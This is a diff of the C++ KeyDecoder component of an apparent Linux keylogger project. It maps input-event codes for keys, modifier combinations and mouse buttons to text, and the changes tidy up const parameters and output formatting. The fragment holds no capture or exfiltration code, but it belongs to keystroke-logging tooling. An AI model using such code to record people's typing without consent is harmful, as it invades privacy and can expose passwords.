@@ -1,7 +1,7 @@
 
 #include <linux/input.h>
 
-#include "KeyDecoder.hpp"
+#include "../include/KeyDecoder.hpp"
 
 
 const std::unordered_map<int, std::string>  keylogger::KeyDecoder::m_mouse_button_mappings = {
@@ -85,7 +85,7 @@ std::string keylogger::KeyDecoder::GetKeyName(int code, bool shifted) const
     return m_key_mappings.at(code);
 }
 
-std::string keylogger::KeyDecoder::GetMouseButtonName(int code)
+std::string keylogger::KeyDecoder::GetMouseButtonName(const int code)
 {
     if (m_mouse_button_mappings.contains(code))
     {
@@ -94,7 +94,7 @@ std::string keylogger::KeyDecoder::GetMouseButtonName(int code)
     return "[MOUSE_UNKNOWN:" + std::to_string(code) + "]";
 }
 
-std::string keylogger::KeyDecoder::ProcessMouseEvent(KeyEvent ev)
+std::string keylogger::KeyDecoder::ProcessMouseEvent(const KeyEvent ev)
 {
     if (ev.value != 1)
     {
@@ -102,11 +102,10 @@ std::string keylogger::KeyDecoder::ProcessMouseEvent(KeyEvent ev)
     }
 
     const std::string button_name = GetMouseButtonName(ev.code);
-    return {"Mouse: " + button_name + " CLICK"};
+    return {"Mouse: " + button_name};
 }
 
-//TODO Fix!
-std::string keylogger::KeyDecoder::ProcessKeyEvent(KeyEvent ev)
+std::string keylogger::KeyDecoder::ProcessKeyEvent(const KeyEvent ev)
 {
     // Update modifier states
     if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL)
@@ -128,7 +127,7 @@ std::string keylogger::KeyDecoder::ProcessKeyEvent(KeyEvent ev)
     else if (ev.code == KEY_CAPSLOCK && ev.value == 1)
     {
         m_caps_lock = !m_caps_lock; // Toggle on key press
-        return {"Modifier: [CAPSLOCK] " + std::string(m_caps_lock ? "ON" : "OFF")};
+        // return {"Modifier: [CAPSLOCK] " + std::string(m_caps_lock ? "ON" : "OFF")};
     }
 
     // Only log key presses (ignore releases and repeats for non-modifiers)
@@ -160,17 +159,19 @@ std::string keylogger::KeyDecoder::ProcessKeyEvent(KeyEvent ev)
     combination += key_name;
 
     // Special handling for modifier-only events
-    if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL ||
-        ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT ||
-        ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT ||
-        ev.code == KEY_LEFTMETA || ev.code == KEY_RIGHTMETA)
-    {
-        return {"Modifier: " + combination + (ev.value == 1 ? " PRESSED" : " RELEASED")};
-    }
-    else
-    {
-        return {"Key: " + combination};
-    }
+    // if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL ||
+    //     ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT ||
+    //     ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT ||
+    //     ev.code == KEY_LEFTMETA || ev.code == KEY_RIGHTMETA)
+    // {
+    //     return {"Modifier: " + combination + (ev.value == 1 ? " PRESSED" : " RELEASED")};
+    // }
+    // else
+    // {
+    //     return {"Key: " + combination};
+    // }
+
+    return combination;
 }
 
 std::string keylogger::KeyDecoder::Decode(KeyEvent ev)
